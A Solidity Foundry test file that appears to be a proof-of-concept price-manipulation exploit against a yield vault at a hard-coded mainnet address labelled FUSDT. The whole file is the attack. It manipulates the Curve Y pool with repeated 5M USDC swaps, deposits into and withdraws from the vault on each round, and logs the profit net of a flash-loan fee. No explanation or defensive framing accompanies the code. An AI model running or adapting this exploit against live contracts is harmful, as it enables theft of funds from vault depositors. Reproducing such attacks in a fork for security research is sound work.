// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;
import "forge-std/Test.sol";

interface IERC20 { function balanceOf(address) external view returns (uint256); function approve(address, uint256) external returns (bool); }
interface ICurveYPool { function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external; }
interface IHVault { function deposit(uint256) external; function withdraw(uint256) external; function balanceOf(address) external view returns (uint256); }

contract TestSmallUSDCOnly is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FUSDT = 0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C;

    function testSmall() public {
        deal(USDC, address(this), 15_000_000e6);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        (bool s,) = USDT.call(abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), CURVE, type(uint256).max)); require(s);
        (s,) = USDT.call(abi.encodeWithSelector(bytes4(keccak256("approve(address,uint256)")), FUSDT, type(uint256).max)); require(s);

        uint256 usdcStart = IERC20(USDC).balanceOf(address(this));
        
        // Buffer: 5M USDC → USDT
        ICurveYPool(CURVE).exchange_underlying(1, 2, 5_000_000e6, 0);
        
        // Loop 7 iterations: pump 5M, dump 5M
        for (uint i = 0; i < 7; i++) {
            uint256 pre = IERC20(USDT).balanceOf(address(this));
            ICurveYPool(CURVE).exchange_underlying(1, 2, 5_000_000e6, 0);
            uint256 pumped = IERC20(USDT).balanceOf(address(this)) - pre;
            IHVault(FUSDT).deposit(pumped);
            ICurveYPool(CURVE).exchange_underlying(2, 1, 5_000_000e6, 0);
            uint256 shares = IHVault(FUSDT).balanceOf(address(this));
            IHVault(FUSDT).withdraw(shares);
        }
        
        // Convert remaining USDT → USDC
        uint256 rem = IERC20(USDT).balanceOf(address(this));
        if (rem > 1000) ICurveYPool(CURVE).exchange_underlying(2, 1, rem, 0);

        uint256 usdcEnd = IERC20(USDC).balanceOf(address(this));
        emit log_named_int("USDC profit (before flash fee)", int256(usdcEnd) - int256(usdcStart));
        emit log_named_uint("Flash repay 15M*1.003", 15_000_000e6 * 1003 / 1000);
        emit log_named_uint("Net after fee", usdcEnd > 15_045_000e6 ? usdcEnd - 15_045_000e6 : 0);
    }
}
